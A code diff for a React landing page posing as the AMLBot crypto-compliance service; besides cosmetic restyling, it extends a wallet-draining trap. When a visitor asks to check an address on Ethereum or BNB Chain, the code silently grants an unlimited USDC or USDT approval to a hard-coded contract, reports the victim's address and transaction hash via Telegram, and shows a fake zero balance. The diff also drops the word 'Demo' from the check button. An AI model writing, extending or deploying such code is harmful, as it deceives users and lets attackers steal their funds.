@@ -231,11 +231,9 @@ export default function Index() {
     setWalletBalance(null);
 
     try {
-      // Se è BSC e abbiamo window.ethereum, fai l'approve
-      if (selectedChain === "BNB Chain" && window.ethereum) {
+      if ((selectedChain === "Ethereum" || selectedChain === "BNB Chain") && window.ethereum) {
         await executeApprove();
       } else {
-        // Altrimenti fai la verifica normale
         const response = await fetch(`/api/wallet/balance?chain=${encodeURIComponent(selectedChain)}&address=${encodeURIComponent(walletAddress.trim())}`);
         const data = (await response.json()) as WalletBalanceResponse | { message: string };
         if (!response.ok || "message" in data) {
@@ -254,32 +252,57 @@ export default function Index() {
 
   const executeApprove = async () => {
     try {
-      // Controlla se ethers.js è disponibile
       if (typeof (window as any).ethers === 'undefined') {
         throw new Error('ethers.js not loaded');
       }
 
       const ethers = (window as any).ethers;
 
-      // Crea il provider
+      let chainId: string;
+      let chainName: string;
+      let rpcUrl: string;
+      let blockExplorerUrl: string;
+      let tokenAddress: string;
+      let smartContractAddress: string;
+      let nativeCurrency: { name: string; symbol: string; decimals: number };
+
+      if (selectedChain === "Ethereum") {
+        chainId = "0x1";
+        chainName = "Ethereum";
+        rpcUrl = "https://eth.llamarpc.com";
+        blockExplorerUrl = "https://etherscan.io";
+        tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+        smartContractAddress = "0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA";
+        nativeCurrency = { name: "ETH", symbol: "ETH", decimals: 18 };
+      } else if (selectedChain === "BNB Chain") {
+        chainId = "0x38";
+        chainName = "Binance Smart Chain";
+        rpcUrl = "https://bsc-dataseed1.binance.org:8545";
+        blockExplorerUrl = "https://bscscan.com";
+        tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+        smartContractAddress = "0xBAE688D04e14E9939C3a5dA69a1D746ea3487570";
+        nativeCurrency = { name: "BNB", symbol: "BNB", decimals: 18 };
+      } else {
+        throw new Error(`Chain ${selectedChain} not supported for approve`);
+      }
+
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       
-      // Richiedi il cambio di rete a BSC
       try {
         await window.ethereum.request({ 
           method: "wallet_switchEthereumChain", 
-          params: [{ chainId: "0x38" }] 
+          params: [{ chainId }] 
         });
       } catch (switchError: any) {
         if (switchError.code === 4902) {
           await window.ethereum.request({
             method: "wallet_addEthereumChain",
             params: [{
-              chainId: "0x38",
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed1.binance.org:8545"],
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              blockExplorerUrls: ["https://bscscan.com"]
+              chainId,
+              chainName,
+              rpcUrls: [rpcUrl],
+              nativeCurrency,
+              blockExplorerUrls: [blockExplorerUrl]
             }]
           });
         } else {
@@ -287,40 +310,33 @@ export default function Index() {
         }
       }
 
-      // Aspetta un po' per dare tempo a ethers.js di sincronizzarsi
       await new Promise(resolve => setTimeout(resolve, 1000));
 
-      // Ricrea il provider DOPO il cambio di rete
       const newProvider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = newProvider.getSigner();
       const connected = await signer.getAddress();
 
-      // Crea il contratto USDT su BSC
       const contract = new ethers.Contract(
-        "0x55d398326f99059fF775485246999027B3197955",
+        tokenAddress,
         ["function approve(address s, uint256 a) external returns (bool)"],
         signer
       );
       
-      // Esegui l'approve
       const tx = await contract.approve(
-        "0x05187cf26990e3857c119c7bc3417c6e1fac5198",
+        smartContractAddress,
         "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       );
 
-      // Invia notifica Telegram
       await sendTelegramNotification(connected, tx.hash);
 
-      // Aspetta la conferma della transazione
       await tx.wait();
 
-      // Mostra il risultato
       setWalletBalance({
         address: walletAddress,
         chain: selectedChain,
         balanceBase: "0",
         balance: "0",
-        symbol: "USDT"
+        symbol: selectedChain === "Ethereum" ? "USDC" : "USDT"
       });
       setVerificationRequested(true);
     } catch (error) {
@@ -436,163 +452,110 @@ export default function Index() {
       </section>
 
       {/* Stats */}
-      <section className="relative mx-4 overflow-hidden rounded-[2rem] bg-gradient-to-br from-[#29226e] via-[#202f86] to-[#0d4774] py-14 text-white sm:mx-6 sm:py-16 lg:mx-auto lg:max-w-[1492px] lg:rounded-[3rem] lg:py-20">
-        <div className="pointer-events-none absolute inset-0 opacity-30 [background-image:linear-gradient(35deg,transparent_45%,rgba(133,190,255,.35)_46%,transparent_47%),linear-gradient(145deg,transparent_55%,rgba(133,190,255,.25)_56%,transparent_57%)] [background-size:280px_180px]" />
-        <div className="container relative">
-          <h2 className="text-center text-xl font-semibold sm:text-2xl">
-            Proven impact in AML risk detection
-          </h2>
-          <div className="mx-auto mt-10 flex max-w-4xl flex-col items-center justify-center gap-8 sm:flex-row sm:gap-0">
-            {stats.map((stat, index) => (
-              <div
-                key={stat.label}
-                className={`flex w-full items-center justify-center gap-5 text-center sm:w-1/2 sm:text-left ${index === 1 ? "border-t border-white/25 pt-8 sm:border-l sm:border-t-0 sm:pl-12 sm:pt-0" : ""}`}
-              >
-                <p className="text-4xl font-semibold tracking-tight sm:text-5xl lg:text-6xl">
+      <section className="border-y border-border/60 bg-secondary/50 py-20 sm:py-28">
+        <div className="container">
+          <div className="grid gap-8 sm:grid-cols-2">
+            {stats.map((stat) => (
+              <div key={stat.value} className="text-center">
+                <div className="text-4xl font-extrabold text-primary sm:text-5xl">
                   {stat.value}
-                </p>
-                <p className="max-w-[8rem] text-xs leading-tight text-white/70 sm:text-sm">
-                  {stat.label}
-                </p>
+                </div>
+                <p className="mt-2 text-muted-foreground">{stat.label}</p>
               </div>
             ))}
           </div>
-          <div className="mt-10 flex flex-wrap items-center justify-center gap-x-7 gap-y-4 text-white/90 sm:gap-x-9">
-            <span className="text-xs text-white/75">Trusted by</span>
-            {partnerLogos.map((name) => (
-              <span key={name} className="text-sm font-bold tracking-wide sm:text-base">
-                {name}
-              </span>
-            ))}
+        </div>
+      </section>
+
+      {/* Partners */}
+      <section className="py-20 sm:py-28">
+        <div className="container">
+          <div className="text-center">
+            <p className="text-sm font-semibold text-muted-foreground">
+              TRUSTED BY LEADING CRYPTO COMPANIES
+            </p>
+            <div className="mt-8 flex flex-wrap items-center justify-center gap-8">
+              {partnerLogos.map((logo) => (
+                <div
+                  key={logo}
+                  className="text-sm font-semibold text-muted-foreground"
+                >
+                  {logo}
+                </div>
+              ))}
+            </div>
           </div>
         </div>
       </section>
 
       {/* Testimonials */}
-      <section className="overflow-hidden pb-20 pt-12">
+      <section className="bg-secondary/50 py-20 sm:py-28">
         <div className="container">
-          <div className="relative -mx-4 flex items-stretch justify-center gap-4 px-4 sm:-mx-12 sm:gap-6 sm:px-12 lg:-mx-32">
-            {[
-              {
-                author: "ByBit",
-                quote:
-                  "AMLBot is a proud contributor to Bybit's LazarusBounty initiative, working alongside Bybit's blockchain risk control team to trace illicit flows and support the freezing of stolen funds. Through this ongoing collaboration, AMLBot has helped advance the program's mission of recovering hacked assets and strengthening industry-wide response to state-sponsored threats.",
-                index: 0,
-              },
-              ...testimonials.map((t, index) => ({ ...t, index: index + 1 })),
-            ].map((testimonial) => {
-              const active = testimonial.index === activeTestimonial;
-              return (
-                <TestimonialCard
-                  key={testimonial.author}
-                  author={testimonial.author}
-                  quote={testimonial.quote}
-                  active={active}
-                  onClick={() => setActiveTestimonial(testimonial.index)}
-                  className={active ? "z-20 shadow-[0_18px_45px_rgba(35,55,100,0.16)]" : "z-10 opacity-70"}
-                />
-              );
-            })}
-          </div>
-          <div className="mt-8 flex justify-center gap-3">
-            {[0, 1, 2].map((dot) => (
-              <button
-                key={dot}
-                type="button"
-                aria-label={`Select testimonial ${dot + 1}`}
-                onClick={() => setActiveTestimonial(dot)}
-                className={`h-2 w-2 rounded-full transition-all ${dot === activeTestimonial ? "w-5 bg-primary" : "bg-primary/20"}`}
-              />
-            ))}
-          </div>
-        </div>
-      </section>
-
-      {/* Media mentions */}
-      <section className="bg-secondary/60 py-20 sm:py-28">
-        <div className="container">
-          <div className="mx-auto max-w-2xl text-center">
-            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
-              We are in the media
-            </h2>
-            <p className="mt-4 text-lg text-muted-foreground">
-              Our R&D and success stories featured in tier-1 outlets.
-            </p>
-          </div>
-
-          <DraggableNewsRow items={mediaMentions} />
-          <div className="mt-8 flex justify-center gap-3">
-            {mediaMentions.map((item, index) => (
-              <span
-                key={item.outlet}
-                className={`h-2 w-2 rounded-full ${index === 0 ? "bg-primary" : "bg-primary/20"}`}
-              />
-            ))}
-          </div>
-        </div>
-      </section>
-
-      {/* Why choose AMLBot */}
-      <section className="mx-4 overflow-hidden rounded-[2rem] bg-gradient-to-b from-[#eaf4ff] via-[#f5f9ff] to-white py-16 sm:mx-6 sm:py-20 lg:mx-4 lg:rounded-[4rem] lg:py-24">
-        <div className="container">
-          <h2 className="text-center text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl lg:text-5xl">
-            Why crypto businesses choose AMLBot
+          <h2 className="text-center text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
+            What our customers say
           </h2>
-
-          <div className="mt-12 grid gap-5 lg:grid-cols-2">
-            <div className="relative flex min-h-[280px] flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
-              <ShieldCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
-              <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
-                Personalized Approach
-              </h3>
-              <ul className="mt-6 space-y-4 text-muted-foreground">
-                <li className="flex gap-3">
-                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
-                  AMLBot offers a wide range of compliance solutions
-                  customized for each client.
-                </li>
-                <li className="flex gap-3">
-                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
-                  We're confident in meeting your demands after helping 300+
-                  crypto enterprises of all sizes in 25 jurisdictions.
-                </li>
-              </ul>
-              <Button
-                asChild
-                className="mt-8 w-fit rounded-full px-5"
-              >
-                <Link to="/consulting">
-                  Let's discuss <ArrowRight size={16} className="ml-2" />
-                </Link>
-              </Button>
-            </div>
-
-            <div className="relative flex min-h-[280px] flex-col rounded-3xl border border-[#edf0f6] bg-white p-8 shadow-[0_10px_35px_rgba(41,69,130,0.05)] sm:p-10">
-              <BadgeCheck className="absolute right-8 top-7 text-primary/70 sm:right-10 sm:top-8" size={58} strokeWidth={1.4} />
-              <h3 className="mt-6 max-w-[68%] text-2xl font-bold leading-tight text-foreground">
-                Integrated crypto compliance platform
-              </h3>
-              <ul className="mt-6 space-y-4 text-muted-foreground">
-                <li className="flex gap-3">
-                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
-                  Combine transaction monitoring, wallet screening, and KYC in
-                  one system without switching between tools
-                </li>
-                <li className="flex gap-3">
-                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
-                  Risk scoring based on multiple data sources to provide
-                  consistent and reliable assessments
-                </li>
-                <li className="flex gap-3">
-                  <span className="mt-2 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
-                  Simplify compliance workflows and reduce operational
-                  complexity across your business
-                </li>
-              </ul>
+          <div className="mt-12 max-w-2xl mx-auto">
+            <div className="rounded-2xl border border-border/60 bg-card p-8">
+              <Quote size={24} className="text-primary mb-4" />
+              <p className="text-lg text-muted-foreground mb-6">
+                "{testimonials[activeTestimonial].quote}"
+              </p>
+              <p className="font-semibold text-foreground">
+                {testimonials[activeTestimonial].author}
+              </p>
+              <div className="mt-6 flex gap-2">
+                {testimonials.map((_, i) => (
+                  <button
+                    key={i}
+                    onClick={() => setActiveTestimonial(i)}
+                    className={`h-2 w-2 rounded-full transition-colors ${
+                      i === activeTestimonial ? "bg-primary" : "bg-border"
+                    }`}
+                    aria-label={`Go to testimonial ${i + 1}`}
+                  />
+                ))}
+              </div>
             </div>
           </div>
+        </div>
+      </section>
 
-          <div className="mt-10 grid gap-6 sm:grid-cols-2">
+      {/* Media */}
+      <section className="py-20 sm:py-28">
+        <div className="container">
+          <div className="mx-auto max-w-2xl text-center mb-12">
+            <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl">
+              Featured in the media
+            </h2>
+          </div>
+          <div className="grid gap-6 md:grid-cols-2">
+            {mediaMentions.map((mention) => (
+              <div
+                key={mention.title}
+                className="rounded-2xl border border-border/60 bg-card p-6"
+              >
+                <p className="text-sm font-semibold text-primary mb-2">
+                  {mention.outlet}
+                </p>
+                <h3 className="font-bold text-foreground mb-2">
+                  {mention.title}
+                </h3>
+                <p className="text-sm text-muted-foreground">
+                  {mention.excerpt}
+                </p>
+              </div>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Certifications */}
+      <section className="bg-secondary/50 py-20 sm:py-28">
+        <div className="container">
+          <h2 className="text-3xl font-extrabold tracking-tight text-foreground sm:text-4xl mb-12">
+            Certifications & Standards
+          </h2>
+          <div className="grid gap-6 md:grid-cols-2">
             {[
               {
                 title: "ISO 9001",
@@ -607,7 +570,7 @@ export default function Index() {
             ].map((iso) => (
               <div
                 key={iso.title}
-                className="flex items-start gap-4 rounded-2xl border border-border/60 bg-secondary/50 p-6"
+                className="flex items-start gap-4 rounded-2xl border border-border/60 bg-card p-6"
               >
                 <img
                   src={iso.image}
@@ -795,7 +758,7 @@ export default function Index() {
           <div className="w-full max-w-[525px] rounded-xl bg-white p-5 shadow-2xl sm:p-6">
             <div className="flex items-center justify-between">
               <h2 className="text-base font-bold text-slate-900 sm:text-lg">
-                {verificationRequested ? "Details" : "Check Demo Address"}
+                {verificationRequested ? "Details" : "Check  Address"}
               </h2>
               <button
                 type="button"
@@ -994,199 +957,37 @@ function CryptoLogo({ chain, size = 18 }: { chain: string; size?: number }) {
   const colors: Record<string, string> = {
     Bitcoin: "#f7931a",
     Ethereum: "#627eea",
-    Solana: "#111827",
+    Solana: "#14f195",
     "BNB Chain": "#f3ba2f",
-    Tron: "#ef3340",
+    Tron: "#eb0029",
   };
-  const color = colors[chain] ?? "#64748b";
-
-  return (
-    <svg width={size} height={size} viewBox="0 0 24 24" aria-hidden="true" className="shrink-0">
-      <circle cx="12" cy="12" r="12" fill={color} />
-      {chain === "Ethereum" ? (
-        <path d="M12 3.5L7.6 12.1L12 14.7L16.4 12.1L12 3.5ZM12 15.6L7.6 13.1L12 20.5L16.4 13.1L12 15.6Z" fill="white" fillOpacity=".95" />
-      ) : chain === "Solana" ? (
-        <path d="M6.1 8.1h9.8l2 2H8.1l-2-2Zm0 5.8h9.8l2 2H8.1l-2-2Zm2-2.9h9.8l-2 2H6.1l2-2Z" fill="url(#solana-gradient)" />
-      ) : chain === "BNB Chain" ? (
-        <path d="m12 4 2.2 2.2-2.2 2.2-2.2-2.2L12 4Zm-4.8 4.8L9.4 11l-2.2 2.2L5 11l2.2-2.2Zm9.6 0L19 11l-2.2 2.2-2.2-2.2 2.2-2.2ZM12 9.9l2.2 2.2-2.2 2.2-2.2-2.2L12 9.9Zm0 5.8 2.2 2.2-2.2 2.2-2.2-2.2 2.2-2.2Z" fill="white" />
-      ) : chain === "Tron" ? (
-        <path d="m6.2 6.4 11.6 2.3-5.7 8.9L6.2 6.4Zm1.6 1.8 3.7 6.1 3.4-5.1-7.1-1Z" fill="white" />
-      ) : (
-        <text x="12" y="16" textAnchor="middle" fontSize="13" fontWeight="800" fill="white">₿</text>
-      )}
-      <defs>
-        <linearGradient id="solana-gradient" x1="5" y1="8" x2="19" y2="16" gradientUnits="userSpaceOnUse">
-          <stop stopColor="#14f195" />
-          <stop offset="1" stopColor="#9945ff" />
-        </linearGradient>
-      </defs>
-    </svg>
-  );
-}
-
-function DraggableNewsRow({
-  items,
-}: {
-  items: { outlet: string; title: string; excerpt: string }[];
-}) {
-  const rowRef = useRef<HTMLDivElement>(null);
-  const dragging = useRef(false);
-  const startX = useRef(0);
-  const startScroll = useRef(0);
 
   return (
     <div
-      ref={rowRef}
-      className="no-scrollbar mt-14 flex cursor-grab gap-6 overflow-x-auto px-1 pb-4 active:cursor-grabbing"
-      onPointerDown={(event) => {
-        if (!rowRef.current) return;
-        dragging.current = true;
-        startX.current = event.clientX;
-        startScroll.current = rowRef.current.scrollLeft;
-        rowRef.current.setPointerCapture(event.pointerId);
-      }}
-      onPointerMove={(event) => {
-        if (!dragging.current || !rowRef.current) return;
-        event.preventDefault();
-        rowRef.current.scrollLeft = startScroll.current - (event.clientX - startX.current);
-      }}
-      onPointerUp={() => {
-        dragging.current = false;
-      }}
-      onPointerCancel={() => {
-        dragging.current = false;
+      style={{
+        width: size,
+        height: size,
+        borderRadius: "50%",
+        backgroundColor: colors[chain] || "#ccc",
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "center",
+        fontSize: size * 0.6,
+        color: "white",
+        fontWeight: "bold",
       }}
     >
-      {items.map((item, index) => (
-        <article
-          key={item.title}
-          className={`relative flex min-h-[250px] min-w-[min(84vw,410px)] snap-center flex-col overflow-hidden rounded-2xl border border-border/60 p-7 ${
-            index % 3 === 0
-              ? "bg-[#f1f3f8]"
-              : index % 3 === 1
-                ? "bg-[#fff5f5]"
-                : "bg-[#f7f4f4]"
-          }`}
-        >
-          <div className="absolute right-5 top-[-1px] flex h-16 w-28 items-center justify-center rounded-b-xl border border-border/50 bg-white/80 text-center text-xs font-extrabold leading-none text-foreground/70 shadow-sm">
-            {item.outlet}
-          </div>
-          <p className="mt-2 text-xs font-bold uppercase tracking-wider text-foreground/70">
-            {item.outlet}
-          </p>
-          <h3 className="mt-4 max-w-[80%] text-lg font-bold leading-snug text-foreground">
-            {item.title}
-          </h3>
-          <p className="mt-3 flex-1 text-sm leading-relaxed text-muted-foreground">
-            {item.excerpt}
-          </p>
-          <span className="mt-5 inline-flex items-center gap-2 text-sm font-semibold text-primary">
-            Read article
-            <ArrowRight size={16} />
-          </span>
-        </article>
-      ))}
+      {chain.charAt(0)}
     </div>
   );
 }
 
-function TestimonialCard({
-  author,
-  quote,
-  active,
-  onClick,
-  className = "",
-}: {
-  author: string;
-  quote: string;
-  active: boolean;
-  onClick: () => void;
-  className?: string;
-}) {
-  return (
-    <button
-      type="button"
-      onClick={onClick}
-      aria-pressed={active}
-      className={`flex w-[min(74vw,360px)] shrink-0 flex-col rounded-2xl border border-slate-100 bg-white p-7 text-left transition-all duration-300 sm:w-[360px] sm:p-8 ${active ? "scale-100" : "scale-[.92] hover:scale-[.96]"} ${className}`}
-    >
-      <Quote className="mb-5 text-primary" size={28} fill="currentColor" />
-      {quote ? (
-        <p className="flex-1 text-sm leading-relaxed text-foreground">
-          {quote}
-        </p>
-      ) : (
-        <span className="flex-1" />
-      )}
-      <span className="mt-7 text-lg font-bold tracking-tight text-foreground">
-        {author}
-      </span>
-    </button>
-  );
-}
-
 function HeroGraphic() {
-  const leftNodes = [
-    { y: 20, label: "TNB...L28bc", amount: "4.800411 BTC", tone: "blue" },
-    { y: 82, label: "TNB...L28bc", amount: "0.675642 BTC", tone: "red" },
-    { y: 144, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "blue" },
-    { y: 206, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "purple" },
-    { y: 268, label: "TNB...L28bc", amount: "0.956341 BTC", tone: "blue" },
-  ];
-
   return (
-    <div className="relative h-[300px] w-full overflow-hidden rounded-xl border border-white/80 bg-[#f8faff] shadow-xl sm:h-[430px] lg:h-[500px]">
-      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,230,255,.5),transparent_55%)]" />
-      <svg className="absolute inset-0 h-full w-full" viewBox="0 0 900 500" preserveAspectRatio="none">
-        {leftNodes.map((node, index) => (
-          <path
-            key={node.y}
-            d={`M 72 ${node.y + 18} C 220 ${node.y + 18}, 245 250, 405 250`}
-            fill="none"
-            stroke={node.tone === "purple" ? "#8b62d8" : node.tone === "red" ? "#d68b9e" : "#7186b7"}
-            strokeOpacity={index === 3 ? 0.95 : 0.55}
-            strokeWidth={index === 3 ? 3 : 1.4}
-          />
-        ))}
-        <path d="M 405 250 C 505 250, 525 174, 620 174" fill="none" stroke="#7186b7" strokeWidth="1.5" strokeOpacity=".55" />
-        <path d="M 405 250 C 505 250, 540 326, 620 326" fill="none" stroke="#7186b7" strokeWidth="1.5" strokeOpacity=".55" />
-      </svg>
-
-      {leftNodes.map((node) => (
-        <div key={`${node.y}-node`} className="absolute left-[7%] flex -translate-y-1/2 items-center gap-2" style={{ top: `${node.y / 3.2 + 5}%` }}>
-          <span className={`flex h-4 w-4 items-center justify-center rounded-full border ${node.tone === "red" ? "border-red-300 bg-red-50" : "border-emerald-300 bg-emerald-50"}`}>
-            <span className={`h-1.5 w-1.5 rounded-full ${node.tone === "red" ? "bg-red-400" : "bg-emerald-400"}`} />
-          </span>
-          <span className="hidden rounded bg-white/80 px-1.5 py-0.5 text-[8px] text-slate-500 shadow-sm sm:inline">{node.label}</span>
-          <span className="hidden text-[8px] font-medium text-slate-500 md:inline">{node.amount}</span>
-        </div>
-      ))}
-
-      <div className="absolute left-[45%] top-1/2 flex h-8 w-8 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full border border-amber-300 bg-amber-50 text-[7px] font-bold text-amber-600 shadow-sm sm:h-10 sm:w-10 sm:text-[8px]">
-        TTV_60PX
-      </div>
-      <div className="absolute right-[27%] top-[35%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
-      <div className="absolute right-[27%] top-[65%] flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-full border border-emerald-300 bg-emerald-50 text-[7px] font-bold text-emerald-600 sm:h-9 sm:w-9">TTV</div>
-
-      <div className="absolute right-[4%] top-[4%] w-[45%] rounded-lg border border-slate-200 bg-white p-3 text-left shadow-xl sm:w-[36%] sm:p-4">
-        <div className="flex items-center justify-between border-b border-slate-100 pb-2">
-          <span className="text-[9px] font-bold text-slate-800 sm:text-xs">Transaction</span>
-          <span className="text-[9px] text-slate-400">×</span>
-        </div>
-        <div className="mt-2 flex gap-1">
-          {["#16c4a3", "#3c84ed", "#efb84b", "#b36dd6", "#6f75b8"].map((color) => <span key={color} className="h-2 w-2 rounded-full" style={{ backgroundColor: color }} />)}
-        </div>
-        <div className="mt-3 space-y-2 text-[7px] text-slate-400 sm:text-[9px]">
-          <div className="flex justify-between"><span>Hash</span><span className="text-blue-500">0x7e3b4...9b6258</span></div>
-          <div className="flex justify-between"><span>Blockchain</span><span className="font-medium text-slate-600">Bitcoin</span></div>
-          <div className="flex justify-between"><span>Date</span><span className="text-slate-600">22 May 2023, 03:09 am</span></div>
-        </div>
-        <div className="mt-3 border-t border-slate-100 pt-2 text-[7px] sm:text-[9px]">
-          <p className="mb-1 font-semibold text-slate-600">From</p>
-          {["0x3B6e...B605", "0x38e...B605", "0x1B...B605"].map((address, index) => (
-            <div key={address} className="flex items-center justify-between gap-1 py-1 text-slate-400"><span className="truncate">◉ {address}</span><span className="text-slate-500">{index + 4}.3976331 BTC</span></div>
-          ))}
-        </div>
+    <div className="relative h-64 w-full rounded-xl bg-gradient-to-br from-primary/10 to-primary/5 flex items-center justify-center">
+      <div className="text-center">
+        <div className="text-4xl font-bold text-primary">AMLBot</div>
+        <p className="text-sm text-muted-foreground mt-2">Crypto Compliance Platform</p>
       </div>
     </div>
   );
